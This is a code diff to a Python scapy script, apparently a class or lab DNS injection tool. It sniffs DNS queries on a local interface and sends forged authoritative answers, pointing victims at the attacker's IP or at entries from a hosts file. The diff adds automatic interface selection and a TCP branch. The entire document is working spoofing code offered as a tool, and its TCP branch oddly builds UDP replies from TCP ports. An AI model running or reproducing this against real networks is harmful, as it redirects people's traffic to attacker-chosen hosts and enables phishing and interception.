@@ -3,6 +3,8 @@
 from scapy.all import *
 from optparse import OptionParser
 import socket
+import netifaces
+
 
 # http://www.cs.dartmouth.edu/~sergey/netreads/local/reliable-dns-spoofing-with-python-scapy-nfqueue.html
 # https://stackoverflow.com/questions/166506/finding-local-ip-addresses-using-pythons-stdlib
@@ -10,50 +12,83 @@ import socket
 class DnsInject:
     def __init__(self, interface, hosts, expression):
         self.interface = interface
+
+        if self.interface is None:
+            interfaces = netifaces.interfaces()
+            interfaces.remove("lo")
+            self.interface = str(interfaces[0])
+
         self.host = hosts
         self.expression = expression
         self.host_dict = {}
-        self.parse_host()
+        if self.host is not None:
+            self.parse_host()
 
     def parse_host(self):
-        file = open(self.host, 'r')
-        # check file exists or not
-        for line in file.readlines():
-            ip, address = line.split()
-            self.host_dict[address] = ip
-        file.close()
+        if os.path.exists(self.host):
+            file = open(self.host, 'r')
+            # check file exists or not
+            for line in file.readlines():
+                ip, address = line.split()
+                self.host_dict[address] = ip
+            file.close()
 
     def start_dnsspoof(self):
+        local_ip = self.get_local_ip()
 
         def dns_callback(packet):
-            local_ip = self.get_local_ip()
             if packet.haslayer(DNSQR):
-                spoorfed_packet =  \
-                    IP(dst=packet[IP].src,
-                       src=packet[IP].dst) / \
-                    UDP(dport=packet[UDP].sport,
-                        sport=packet[UDP].dport) / \
-                    DNS(id=packet[DNS].id,
-                        qd=packet[DNS].qd,
-                        aa=1,
-                        qr=1, \
-                        an=DNSRR(
-                            rrname=packet[DNS].qd.qname,
-                            ttl=10,
-                            rdata=local_ip)
-                    )
-                send(spoorfed_packet)
-                print 'Sent:', spoorfed_packet.summary()
+                if packet[DNS].qd.qname in self.host_dict:
+                    local_ip = str(self.host_dict[packet[DNS].qd.qname])
+                if packet.haslayer(UDP) and packet.haslayer(IP):
+                    spoofed_packet = \
+                        IP(dst=packet[IP].src,
+                           src=packet[IP].dst) / \
+                        UDP(dport=packet[UDP].sport,
+                            sport=packet[UDP].dport) / \
+                        DNS(id=packet[DNS].id,
+                            qd=packet[DNS].qd,
+                            aa=1,
+                            qr=1, \
+                            an=DNSRR(
+                                rrname=packet[DNS].qd.qname,
+                                ttl=10,
+                                rdata=local_ip)
+                            )
+                    send(spoofed_packet)
+                    print 'Sent:', spoofed_packet.summary()
+                elif packet.haslayer(TCP) and packet.haslayer(IP):
+                    spoofed_packet = \
+                        IP(dst=packet[IP].src,
+                           src=packet[IP].dst) / \
+                        UDP(dport=packet[TCP].sport,
+                            sport=packet[TCP].dport) / \
+                        DNS(id=packet[DNS].id,
+                            qd=packet[DNS].qd,
+                            aa=1,
+                            qr=1, \
+                            an=DNSRR(
+                                rrname=packet[DNS].qd.qname,
+                                ttl=10,
+                                rdata=local_ip)
+                            )
+                    send(spoofed_packet)
+                    print 'Sent:', spoofed_packet.summary()
 
-        sniff(filter=self.expression,
-              prn=dns_callback,
-              store=0,
-              iface=self.interface)
+
+        sniff(
+            filter=self.expression,
+            prn=dns_callback,
+            store=0,
+            iface=self.interface
+        )
 
     def get_local_ip(self):
+        # return "127.0.0.1"
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect(("8.8.8.8", 80))
-        return  s.getsockname()[0]
+        return s.getsockname()[0]
+
 
 if __name__ == '__main__':
     optparser = OptionParser()
@@ -65,6 +100,8 @@ if __name__ == '__main__':
     expression = " ".join(args)
 
     dnsinject = DnsInject(options.interface,
-                          options.hosts, expression)
+                          options.hosts,
+                          expression
+                          )
 
     dnsinject.start_dnsspoof()
